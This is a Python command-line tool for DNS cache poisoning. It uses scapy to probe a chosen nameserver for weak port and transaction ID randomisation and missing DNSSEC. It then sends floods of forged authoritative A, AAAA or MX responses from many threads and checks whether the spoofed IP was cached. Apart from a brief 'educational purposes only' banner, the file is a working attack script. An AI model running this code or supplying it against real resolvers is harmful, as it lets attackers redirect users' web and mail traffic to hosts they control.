#!/usr/bin/env python3

import socket
import sys
import random
import threading
import time
import argparse
import logging
import json
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import *
from scapy.layers.dns import *

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class DNSCachePoisoner:
    def __init__(self, target_domain, nameserver, spoofed_ip, record_type='A'):
        self.target_domain = target_domain
        self.nameserver = nameserver
        self.spoofed_ip = spoofed_ip
        self.record_type = record_type
        self.transaction_id = random.randint(0, 65535)
        self.query_port = random.randint(1024, 65535)
        self.results = {
            'vulnerability_checks': [],
            'poisoning_attempts': [],
            'success_rate': 0.0
        }
        
    def generate_dns_query(self, qtype='A'):
        """Generate a DNS query packet with specified record type"""
        return IP(dst=self.nameserver)/\
               UDP(sport=self.query_port, dport=53)/\
               DNS(rd=1, id=self.transaction_id,
                   qd=DNSQR(qname=self.target_domain, qtype=qtype))
    
    def generate_spoofed_response(self, qtype='A'):
        """Generate a spoofed DNS response packet"""
        response = IP(dst=self.nameserver)/\
                  UDP(sport=53, dport=self.query_port)/\
                  DNS(id=self.transaction_id,
                      qr=1,  # Response
                      aa=1,  # Authoritative
                      rd=1,  # Recursion Desired
                      ra=1,  # Recursion Available
                      qd=DNSQR(qname=self.target_domain, qtype=qtype))

        # Add appropriate resource record based on type
        if qtype == 'A':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='A',
                ttl=3600,
                rdata=self.spoofed_ip
            )
        elif qtype == 'AAAA':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='AAAA',
                ttl=3600,
                rdata=self.spoofed_ip
            )
        elif qtype == 'MX':
            response[DNS].an = DNSRR(
                rrname=self.target_domain,
                type='MX',
                ttl=3600,
                rdata=f"10 mail.{self.target_domain}"
            )
        
        return response

    def check_source_port_randomization(self, num_queries=10):
        """Test if the DNS server uses random source ports"""
        logger.info("Testing source port randomization...")
        ports = set()
        
        for _ in range(num_queries):
            query = self.generate_dns_query()
            reply = sr1(query, timeout=2, verbose=0)
            if reply and UDP in reply:
                ports.add(reply[UDP].sport)
            time.sleep(0.5)
        
        port_randomization = len(ports) > num_queries * 0.8
        self.results['vulnerability_checks'].append({
            'check': 'source_port_randomization',
            'vulnerable': not port_randomization,
            'details': f"Unique ports observed: {len(ports)}/{num_queries}"
        })
        
        return not port_randomization

    def check_txid_randomization(self, num_queries=10):
        """Test if the DNS server uses random transaction IDs"""
        logger.info("Testing transaction ID randomization...")
        txids = set()
        
        for _ in range(num_queries):
            query = self.generate_dns_query()
            reply = sr1(query, timeout=2, verbose=0)
            if reply and DNS in reply:
                txids.add(reply[DNS].id)
            time.sleep(0.5)
        
        txid_randomization = len(txids) > num_queries * 0.8
        self.results['vulnerability_checks'].append({
            'check': 'txid_randomization',
            'vulnerable': not txid_randomization,
            'details': f"Unique TXIDs observed: {len(txids)}/{num_queries}"
        })
        
        return not txid_randomization

    def detect_vulnerability(self):
        """Enhanced vulnerability detection with multiple checks"""
        logger.info(f"Testing {self.nameserver} for DNS cache poisoning vulnerabilities...")
        
        vulnerabilities = []
        
        # Check source port randomization
        if self.check_source_port_randomization():
            vulnerabilities.append("Predictable source ports")
            
        # Check transaction ID randomization
        if self.check_txid_randomization():
            vulnerabilities.append("Predictable transaction IDs")
            
        # Check for DNSSEC
        query = self.generate_dns_query()
        reply = sr1(query, timeout=2, verbose=0)
        has_dnssec = False
        
        if reply and DNS in reply:
            if reply[DNS].ar and any(rr.type == 46 for rr in reply[DNS].ar):
                has_dnssec = True
        
        self.results['vulnerability_checks'].append({
            'check': 'dnssec',
            'vulnerable': not has_dnssec,
            'details': "DNSSEC not implemented"
        })
        
        if not has_dnssec:
            vulnerabilities.append("No DNSSEC protection")
        
        return bool(vulnerabilities), ", ".join(vulnerabilities) if vulnerabilities else "No obvious vulnerabilities detected"

    def poison_worker(self, attempt_id):
        """Worker function for parallel poisoning attempts"""
        legitimate_query = self.generate_dns_query(self.record_type)
        send(legitimate_query, verbose=0)
        
        # Send multiple spoofed responses with different transaction IDs
        for _ in range(50):
            self.transaction_id = random.randint(0, 65535)
            spoofed_response = self.generate_spoofed_response(self.record_type)
            send(spoofed_response, verbose=0)
        
        return attempt_id

    def poison_cache(self, duration=30, max_attempts=1000, max_workers=10):
        """Enhanced cache poisoning with parallel processing"""
        logger.info(f"Attempting cache poisoning attack on {self.nameserver}")
        logger.info(f"Target domain: {self.target_domain}")
        logger.info(f"Spoofed IP: {self.spoofed_ip}")
        logger.info(f"Record type: {self.record_type}")
        
        start_time = time.time()
        successful_attempts = 0
        total_attempts = 0
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                while time.time() - start_time < duration and total_attempts < max_attempts:
                    futures.append(
                        executor.submit(self.poison_worker, total_attempts)
                    )
                    total_attempts += 1
                    
                    # Process completed attempts
                    for future in as_completed(futures):
                        attempt_id = future.result()
                        
                        # Verify if poisoning was successful
                        verify_query = self.generate_dns_query(self.record_type)
                        reply = sr1(verify_query, timeout=2, verbose=0)
                        
                        if reply and DNS in reply and reply[DNS].an:
                            for rr in reply[DNS].an:
                                if rr.rdata == self.spoofed_ip:
                                    successful_attempts += 1
                                    logger.info(f"Successful poisoning detected! (Attempt {attempt_id})")
                        
                        if total_attempts % 10 == 0:
                            logger.info(f"Made {total_attempts} attempts, {successful_attempts} successful...")
                        
                        time.sleep(0.1)
        
        except KeyboardInterrupt:
            logger.warning("\nAttack interrupted by user")
        
        # Calculate success rate
        success_rate = (successful_attempts / total_attempts * 100) if total_attempts > 0 else 0
        self.results['poisoning_attempts'].append({
            'total_attempts': total_attempts,
            'successful_attempts': successful_attempts,
            'success_rate': success_rate,
            'duration': time.time() - start_time
        })
        
        logger.info(f"Attack completed after {total_attempts} attempts")
        logger.info(f"Success rate: {success_rate:.2f}%")
        
        return successful_attempts > 0

    def save_results(self, output_file):
        """Save attack results to a file"""
        self.results['timestamp'] = datetime.now().isoformat()
        self.results['target_domain'] = self.target_domain
        self.results['nameserver'] = self.nameserver
        self.results['record_type'] = self.record_type
        
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(output_path, 'w') as f:
            json.dump(self.results, f, indent=4)
        
        logger.info(f"Results saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description='Enhanced DNS Cache Poisoning Tool')
    parser.add_argument('--target', required=True, help='Target domain to poison')
    parser.add_argument('--nameserver', required=True, help='DNS server to attack')
    parser.add_argument('--spoofed-ip', required=True, help='IP address to inject')
    parser.add_argument('--record-type', choices=['A', 'AAAA', 'MX'], default='A',
                       help='DNS record type to poison')
    parser.add_argument('--mode', choices=['detect', 'poison', 'both'], 
                       default='detect', help='Operation mode')
    parser.add_argument('--duration', type=int, default=30,
                       help='Duration of poisoning attempt in seconds')
    parser.add_argument('--max-attempts', type=int, default=1000,
                       help='Maximum number of poisoning attempts')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of parallel threads for poisoning')
    parser.add_argument('--output', type=str, default='dns_poison_results.json',
                       help='Output file for results')
    
    args = parser.parse_args()
    
    # Print warning message
    print("""
    [!] WARNING: This tool is for educational purposes only.
    [!] Unauthorized DNS cache poisoning attempts are illegal.
    [!] Use only on systems you have permission to test.
    """)
    
    # Check if running as root/admin
    if os.geteuid() != 0:
        logger.error("This script requires root/administrator privileges")
        sys.exit(1)
    
    poisoner = DNSCachePoisoner(
        args.target,
        args.nameserver,
        args.spoofed_ip,
        args.record_type
    )
    
    try:
        if args.mode in ['detect', 'both']:
            vulnerable, message = poisoner.detect_vulnerability()
            logger.info("\nVulnerability Detection Results:")
            logger.info(f"Status: {'Vulnerable' if vulnerable else 'Not Vulnerable'}")
            logger.info(f"Details: {message}")
        
        if args.mode in ['poison', 'both']:
            if args.mode == 'both' and not vulnerable:
                logger.warning("\nServer appears not vulnerable, but proceeding with poisoning attempt...")
            poisoner.poison_cache(
                duration=args.duration,
                max_attempts=args.max_attempts,
                max_workers=args.threads
            )
        
        # Save results
        poisoner.save_results(args.output)
        
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 